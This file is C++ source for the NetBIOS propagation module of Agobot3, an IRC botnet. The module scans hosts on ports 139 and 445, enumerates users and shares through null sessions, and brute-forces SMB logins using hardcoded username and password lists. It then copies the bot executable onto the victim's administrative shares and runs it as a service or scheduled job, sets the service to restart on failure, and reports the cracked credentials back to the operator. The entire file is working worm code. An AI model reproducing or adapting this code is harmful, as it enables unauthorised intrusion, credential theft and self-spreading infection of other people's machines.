/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2003 Ago
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "utility.h"

#ifdef WIN32

#include "resource.h"
#include <lmat.h>

typedef struct shareinfo_s
{	CString sName;
	CString sRemark; } shareinfo;

typedef struct userinfo_s
{	CString sName;
	CString sServer; } userinfo;

#define lenof(x) (sizeof(x)/sizeof(x)[0])

class CScannerNetBios : public CScannerBase
{
public:
	CScannerNetBios();
	virtual ~CScannerNetBios() throw() { }
	bool Exploit();
protected:
	NET_API_STATUS m_NetApiStatus;
	USE_INFO_2 m_UseInfo;
	USER_INFO_1 *m_UserInfo;
	SHARE_INFO_1* m_ShareInfo;

	WCHAR m_wszHost[MAX_PATH];
	WCHAR m_wszServer[MAX_PATH];
	WCHAR m_wszResource[MAX_PATH];

	bool m_bGotShares;
	bool m_bGotUsers;

	list<userinfo*> m_lUsers;
	list<shareinfo*> m_lShares;

	bool NullSession();
	bool CloseSession();
	bool GetShares(list<shareinfo*> *lpShares);
	bool GetUsers(list<userinfo*> *lpUsers);
	bool AuthSession(const char *user, const char *password);
	bool Exploit(const char *share, const char *host, const char *user, const char *password);
	bool StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password);
	bool StartViaCreateService(const char *share, const char *host, const char *user, const char *password);
};

char *names[] = {	"Administrator", "Administrateur" ,"Coordinatore","Administrador",
					"Verwalter","Ospite", "kanri", "kanri-sha", "admin", "administrator", "Default", \
					"Convidado", "mgmt", "Standard", "User", "Administratör", \
					"administrador", "Owner", "user", "server", \
					"Test", "Guest", "Gast", "Inviter", "a", "aaa", "abc", "x", "xyz", \
					"Dell", "home", "pc", "test", "temp", "win", "asdf", "qwer", \
					"OEM", "root", "wwwadmin", "login", "", \
     				"owner", "mary", "admins", "computer", "xp", \
     				"OWNER", "mysql", "database", "teacher", "student", \
					NULL };



char *pwds[]  = {	"103015", "admin", "Admin", "password", "Password", "1", "12", "123", "1234", \
					"!@#$", "asdfgh", "!@#$%", "!@#$%^", "!@#$%^&", "!@#$%^&*", "WindowsXP", \
					"windows2k", "windowsME", "windows98", "windoze", "hax", "dude", "owned", \
					"lol", "ADMINISTRATOR", "rooted", "noob", "TEMP", "share", "r00t", \
					"ROOT", "TEST", "SYSTEM", "LOCAL", "SERVER", "ACCESS", "BACKUP", "computer", \
					"fucked", "gay", "idiot", "Internet", "test", "2003", "2004", "backdoor", \
					"whore", "wh0re", "CNN", "pwned", "own", "crash", "passwd", "PASSWD", \
					"devil", "linux", "UNIX", "feds", "fish", "changeme", "ASP", "PHP", "666", \
					"BOX", "Box", "box", "12345", "123456", "1234567", "12345678", "123456789", \
					"654321", "54321", "111", "000000", "00000000", "11111111", "88888888", \
					"pass", "passwd", "database", "abcd", "oracle", "sybase", "123qwe", \
					"server", "computer", "Internet", "super", "123asd", "ihavenopass", \
					"godblessyou", "enable", "xp", "2002", "2003", "2600", "0", "110", \
					"111111", "121212", "123123", "1234qwer", "123abc", "007", "alpha", \
					"patrick", "pat", "administrator", "root", "sex", "god", "foobar", \
					"a", "aaa", "abc", "test", "temp", "win", "pc", "asdf", "secret", \
					"qwer", "yxcv", "zxcv", "home", "xxx", "owner", "login", "Login", \
					"Coordinatore", "Administrador", "Verwalter", "Ospite", "administrator", \
					"Default", "administrador", "admins", "teacher", "student", "superman", \
					"supersecret", "kids", "penis", "wwwadmin", "database", "changeme", \
					"test123", "user", "private", "69", "root", "654321", "xxyyzz", "asdfghjkl", \
					"mybaby", "vagina", "pussy", "leet", "metal", "work", "school", "mybox", \
					"box", "werty", "baby", "porn", "homework", "secrets", "x", "z", \
					"qwertyuiop", "secret", "Administrateur", "abc123", "password123", "red123", \
					"qwerty", "admin123", "zxcvbnm", "poiuytrewq", "pwd", "pass", "love", "mypc", \
					"mypass", "pw", NULL };

char *shares[]= {	"admin$", "c$", "d$", "e$", "print$", "c",  NULL };

/*
		Netbios Scanner starts here
		scans for netbios with easy to guess passwords
*/

CScannerNetBios::CScannerNetBios() { m_szType="CScannerNetBios"; m_sScannerName.Assign("NetBios"); }
bool CScannerNetBios::Exploit()
{	//SendLocal("%s: scanning ip %s", m_sScannerName.CStr(), m_sSocket.m_szHost);

	mbstowcs(m_wszHost, m_sSocket.m_szHost, lenof(m_wszHost));
	wcscpy(m_wszServer, L"\\\\"); wcscat(m_wszServer, m_wszHost);
	wcscpy(m_wszResource, m_wszServer); wcscat(m_wszResource, L"\\IPC$");

	int iNameCount=0, iShareCount=0; m_lUsers.clear(); m_lShares.clear();

	CloseSession();
	if(NullSession()) { GetUsers(&m_lUsers); GetShares(&m_lShares); CloseSession(); }

	while(names[iNameCount])
	{	userinfo *pUser=new userinfo;
		pUser->sName.Assign(names[iNameCount]);
		pUser->sServer.Assign(m_sSocket.m_szHost);
		m_lUsers.push_back(pUser);
		iNameCount++; }
	
	while(shares[iShareCount])
	{	shareinfo *pShare=new shareinfo;
		pShare->sName.Assign(shares[iShareCount]);
		pShare->sRemark.Assign("default");
		m_lShares.push_back(pShare);
		iShareCount++; }
	
	bool bExploited=false;
	
	list<shareinfo*>::iterator iShares; iShares=m_lShares.begin();
	list<userinfo*>::iterator iUsers; iUsers=m_lUsers.begin();
	while(iShares!=m_lShares.end() && !bExploited && m_pNetRange.pScanner->m_bScanning)
	{	while(iUsers!=m_lUsers.end() && !bExploited && m_pNetRange.pScanner->m_bScanning)
		{	WCHAR wszShare[MAX_PATH];
			wcscpy(m_wszServer, L"\\\\"); wcscat(m_wszServer, m_wszHost);
			wcscpy(m_wszResource, m_wszServer); wcscat(m_wszResource, L"\\");
			mbstowcs(wszShare, (*iShares)->sName, lenof(wszShare));
			wcscat(m_wszResource, wszShare);

			if(AuthSession((*iUsers)->sName.CStr(), "") && !bExploited)
			{	bExploited=Exploit((*iShares)->sName.CStr(), m_sSocket.m_szHost, (*iUsers)->sName.CStr(), "");
				CloseSession(); }

			if(AuthSession((*iUsers)->sName.CStr(), (*iUsers)->sName.CStr()) && !bExploited)
			{	bExploited=Exploit((*iShares)->sName.CStr(), m_sSocket.m_szHost, (*iUsers)->sName.CStr(), (*iUsers)->sName.CStr());
				CloseSession(); }

			int pwd_count=0; while(pwds[pwd_count] && !bExploited)
			{	if(AuthSession((*iUsers)->sName.CStr(), pwds[pwd_count]) && !bExploited)
				{	bExploited=Exploit((*iShares)->sName.CStr(), m_sSocket.m_szHost, (*iUsers)->sName.CStr(), pwds[pwd_count]);
					CloseSession(); }
				pwd_count++; }

			iUsers++; }
		iShares++; iUsers=m_lUsers.begin(); }

	for(iUsers=m_lUsers.begin(); iUsers!=m_lUsers.end(); ++iUsers) delete (*iUsers);
	for(iShares=m_lShares.begin(); iShares!=m_lShares.end(); ++iShares) delete (*iShares);
	m_lUsers.clear(); m_lShares.clear();

	return bExploited;
}

bool CScannerNetBios::NullSession()
{	memset(&m_UseInfo, 0, sizeof(m_UseInfo));
	m_UseInfo.ui2_local=NULL;
	m_UseInfo.ui2_remote=(unsigned short*)m_wszResource;
	m_UseInfo.ui2_password=L"";
	m_UseInfo.ui2_username=L"";
	m_UseInfo.ui2_domainname=L"";
	m_UseInfo.ui2_asg_type=USE_IPC;

	m_NetApiStatus=NetUseAdd(NULL, 2, (LPBYTE)&m_UseInfo, NULL);
	if(m_NetApiStatus==ERROR_SESSION_CREDENTIAL_CONFLICT) return true;
	if(m_NetApiStatus==NERR_Success) return true; else return false; }

bool CScannerNetBios::AuthSession(const char *user, const char *password)
{	memset(&m_UseInfo, 0, sizeof(m_UseInfo));
	m_UseInfo.ui2_local=NULL;
	WCHAR wszUser[256], wszPassword[256];
	mbstowcs(wszUser, user, lenof(wszUser));
	mbstowcs(wszPassword, password, lenof(wszPassword));
	m_UseInfo.ui2_remote=m_wszResource;
	m_UseInfo.ui2_password=wszPassword;
	m_UseInfo.ui2_username=wszUser;
	m_UseInfo.ui2_domainname=L"";
	m_NetApiStatus=NetUseAdd(NULL, 2, (LPBYTE)&m_UseInfo, NULL);
	if(m_NetApiStatus==ERROR_SESSION_CREDENTIAL_CONFLICT) return true;
	if(m_NetApiStatus==NERR_Success) return true; else return false;
}

bool CScannerNetBios::CloseSession()
{	m_NetApiStatus=NetUseDel(NULL, m_wszResource, USE_LOTS_OF_FORCE);
	if(m_NetApiStatus==NERR_Success) return true; else return false; }

bool CScannerNetBios::GetShares(list<shareinfo*> *lpShares)
{	DWORD dwEntriesRead=0, dwTotalEntries=0;
	m_NetApiStatus=NetShareEnum(m_wszServer, 1, (LPBYTE*)&m_ShareInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, NULL);
	if(m_NetApiStatus!=NERR_Success) return false;
	SHARE_INFO_1* l_ShareInfo=m_ShareInfo;
	for(int x=0; x<(int)dwTotalEntries; x++)
	{	shareinfo *pShare=new shareinfo;
		wcstombs(pShare->sName.GetBuffer(256), (const wchar_t*)l_ShareInfo->shi1_netname, 256);
		wcstombs(pShare->sRemark.GetBuffer(256), (const wchar_t*)l_ShareInfo->shi1_remark, 256);
		if(stricmp(pShare->sName.CStr(), "ipc$")) lpShares->push_back(pShare); l_ShareInfo++; }
	if(m_ShareInfo!=0) NetApiBufferFree(m_ShareInfo);
	return true; }

bool CScannerNetBios::GetUsers(list<userinfo*> *lpUsers)
{	DWORD dwEntriesRead=0, dwRemaining=0, dwResume=0, dwRC; do
	{	dwRC=NetUserEnum(m_wszServer, 1, 0, (LPBYTE*)&m_UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwRemaining, &dwResume);
		if(dwRC!=ERROR_MORE_DATA && dwRC!=ERROR_SUCCESS) break;
		USER_INFO_1 *l_UserInfo=m_UserInfo;
		for(int x=0; x<(int)dwEntriesRead; x++)
		{	userinfo *pUser=new userinfo;
			wcstombs(pUser->sName.GetBuffer(256), l_UserInfo->usri1_name, 256);
			wcstombs(pUser->sServer.GetBuffer(256), m_wszHost, 256);
			lpUsers->push_back(pUser); l_UserInfo++; }
		if(m_UserInfo!=0) NetApiBufferFree(m_UserInfo); }
	while(dwRC==ERROR_MORE_DATA);
	if(dwRC!=ERROR_SUCCESS) return false; return true; }

bool CScannerNetBios::Exploit(const char *share, const char *host, const char *user, const char *password)
{	char buffer[MAX_PATH]; sprintf(buffer, "\\\\%s\\%s\\testfile", host, share);
	FILE *fp=fopen(buffer, "w+"); if(fp)
	{	fclose(fp);
//		SendLocal("%s: Exploiting \\\\%s\\%s with l/p: %s/%s", m_sScannerName.CStr(), host, share, user, password);
		if(StartViaCreateService(share, host, user, password)) return true;
		else if(StartViaNetScheduleJobAdd(share, host, user, password)) return true;
		else return false; }
	else return false; }

bool CScannerNetBios::StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password)
{	char buffer[MAX_PATH]; CString sReply; LPTIME_OF_DAY_INFO pTOD=NULL; AT_INFO at; DWORD dwJobId;

	GetFilename(buffer, MAX_PATH);
	char rem_buffer[MAX_PATH]; sprintf(rem_buffer, "\\\\%s\\%s\\%s", host, share, g_pMainCtrl->m_cBot.bot_filename.sValue.CStr());
	unsigned long lTimeoutStart=GetTickCount();

	while(CopyFile(buffer, rem_buffer, false)==false && GetTickCount()-lTimeoutStart<100000) Sleep(100);

	m_NetApiStatus=NetRemoteTOD(m_wszHost, (LPBYTE*)&pTOD);
	if(m_NetApiStatus==NERR_Success)
	{	wchar_t wszBotRemote[MAX_PATH]; wchar_t wszFilename[MAX_PATH];
		
		wcscpy(wszBotRemote, m_wszResource);

		mbstowcs(wszFilename, g_pMainCtrl->m_cBot.bot_filename.sValue.CStr(), lenof(wszFilename));

		wcscat(wszBotRemote, L"\\");

		wcscat(wszBotRemote, wszFilename);

		memset(&at, 0, sizeof(at)); at.Command=&wszBotRemote[0];
		unsigned long lMsecs=(pTOD->tod_hunds*10); lMsecs+=(pTOD->tod_secs*1000);
		lMsecs+=((pTOD->tod_mins*60)*1000); lMsecs+=(((pTOD->tod_hours*60)*60)*1000);
		lMsecs+=60000; // 60 minute offset
		at.DaysOfMonth=0; at.DaysOfWeek=0; at.JobTime=lMsecs;
		m_NetApiStatus=NetScheduleJobAdd(m_wszHost, (LPBYTE)&at, &dwJobId);
		if(m_NetApiStatus==NERR_Success) {
			SendLocal("%s: Exploited \\\\%s\\%s with l/p: %s/%s (NetScheduleJobAdd)!!!", m_sScannerName.CStr(), host, share, user, password);
			return true; }
		else return false; }
	else return false; }

bool CScannerNetBios::StartViaCreateService(const char *share, const char *host, const char *user, const char *password)
{	bool bRetVal=false; char buffer[MAX_PATH]; SC_HANDLE hServiceControl=OpenSCManager(host, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false; char szBotRemote[MAX_PATH]; CString sTempPath;

	GetFilename(buffer, MAX_PATH);
	sprintf(szBotRemote, "\\\\%s\\%s\\%s", host, share, g_pMainCtrl->m_cBot.bot_filename.sValue.CStr());
	long lTimeoutStart=GetTickCount();
	while(CopyFile(buffer, szBotRemote, false)==false && GetTickCount()-lTimeoutStart<100000) Sleep(100);
	
	CString rndSvcName=g_pMainCtrl->m_sTmpSvcName.CStr();

	CString sSvcCmd; sSvcCmd.Format("\"%s\" -service", szBotRemote);
	SC_HANDLE hService=CreateService(hServiceControl, rndSvcName,
		rndSvcName, SERVICE_ALL_ACCESS, \
		SERVICE_WIN32_SHARE_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, \
		sSvcCmd.CStr(), NULL, NULL, NULL, NULL, NULL);
	if(!hService) {
		DWORD dwError=GetLastError();
		if(dwError==ERROR_SERVICE_EXISTS) {
			hService=OpenService(hServiceControl, rndSvcName, SERVICE_ALL_ACCESS);
			if(!hService) { CloseServiceHandle(hServiceControl); return false; }
			SERVICE_STATUS sStatus; ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
			DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);
			return StartViaCreateService(share, host, user, password);
		} else {
			CloseServiceHandle(hServiceControl); return false; }
	}

	SERVICE_STATUS ssStatus;
	
	if (StartService(hService, 0, NULL) != 0)
	{	SC_ACTION scActions[1]; scActions[0].Delay=1; scActions[0].Type=SC_ACTION_RESTART;
		SERVICE_FAILURE_ACTIONS sfActions; sfActions.dwResetPeriod=5; sfActions.lpRebootMsg=NULL;
		sfActions.lpCommand=NULL; sfActions.cActions=1; sfActions.lpsaActions=scActions;
		ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfActions);
		bRetVal=true;
	} else bRetVal=false;

	if(hService) CloseServiceHandle(hService);
	if(hServiceControl) CloseServiceHandle(hServiceControl);
	if(bRetVal) SendLocal("%s: Exploited \\\\%s\\%s with %s/%s (CreateService)", m_sScannerName.CStr(), host, share, user, password);

	return bRetVal; }

#endif // WIN32

REGSCANNER(NetBios_139, NetBios, 139, true, false)
REGSCANNER(NetBios_445, NetBios, 445, false, false)
